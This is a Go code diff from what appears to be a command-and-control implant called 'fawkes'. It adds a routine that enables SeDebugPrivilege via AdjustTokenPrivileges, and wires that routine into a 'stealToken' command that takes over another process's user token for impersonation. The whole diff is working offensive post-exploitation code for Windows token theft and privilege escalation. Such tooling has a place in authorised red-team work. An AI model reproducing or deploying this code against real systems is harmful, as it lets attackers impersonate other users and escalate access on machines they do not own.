@@ -6,6 +6,7 @@ package commands
 import (
 	"encoding/json"
 	"fmt"
+	"unsafe"
 
 	"fawkes/pkg/structs"
 
@@ -16,7 +17,73 @@ var (
 	advapi32                = windows.NewLazySystemDLL("advapi32.dll")
 	procImpersonateLoggedOnUser = advapi32.NewProc("ImpersonateLoggedOnUser")
 	procRevertToSelf        = advapi32.NewProc("RevertToSelf")
+	procLookupPrivilegeValue = advapi32.NewProc("LookupPrivilegeValueW")
+	procAdjustTokenPrivileges = advapi32.NewProc("AdjustTokenPrivileges")
 )
+
+const (
+	SE_PRIVILEGE_ENABLED = 0x00000002
+	SE_DEBUG_NAME        = "SeDebugPrivilege"
+)
+
+type LUID struct {
+	LowPart  uint32
+	HighPart int32
+}
+
+type LUID_AND_ATTRIBUTES struct {
+	Luid       LUID
+	Attributes uint32
+}
+
+type TOKEN_PRIVILEGES struct {
+	PrivilegeCount uint32
+	Privileges     [1]LUID_AND_ATTRIBUTES
+}
+
+func enableDebugPrivilege() error {
+	var hToken windows.Token
+	err := windows.OpenProcessToken(windows.CurrentProcess(), windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY, &hToken)
+	if err != nil {
+		return err
+	}
+	defer hToken.Close()
+
+	var luid LUID
+	privName, _ := windows.UTF16PtrFromString(SE_DEBUG_NAME)
+	ret, _, _ := procLookupPrivilegeValue.Call(
+		0,
+		uintptr(unsafe.Pointer(privName)),
+		uintptr(unsafe.Pointer(&luid)),
+	)
+	if ret == 0 {
+		return fmt.Errorf("LookupPrivilegeValue failed")
+	}
+
+	tp := TOKEN_PRIVILEGES{
+		PrivilegeCount: 1,
+		Privileges: [1]LUID_AND_ATTRIBUTES{
+			{
+				Luid:       luid,
+				Attributes: SE_PRIVILEGE_ENABLED,
+			},
+		},
+	}
+
+	ret, _, _ = procAdjustTokenPrivileges.Call(
+		uintptr(hToken),
+		0,
+		uintptr(unsafe.Pointer(&tp)),
+		0,
+		0,
+		0,
+	)
+	if ret == 0 {
+		return fmt.Errorf("AdjustTokenPrivileges failed")
+	}
+
+	return nil
+}
 
 type StealTokenCommand struct{}
 
@@ -71,6 +138,11 @@ func (c *StealTokenCommand) ExecuteWithAgent(task structs.Task, agent *structs.A
 
 func stealToken(pid uint32) (string, error) {
 	var output string
+
+	// Enable SeDebugPrivilege to open tokens from other processes
+	if err := enableDebugPrivilege(); err != nil {
+		output += fmt.Sprintf("Warning: Could not enable SeDebugPrivilege: %v\n", err)
+	}
 
 	// Get original context before stealing (like Apollo shows "Old Claims")
 	processHandle, err := windows.GetCurrentProcess()
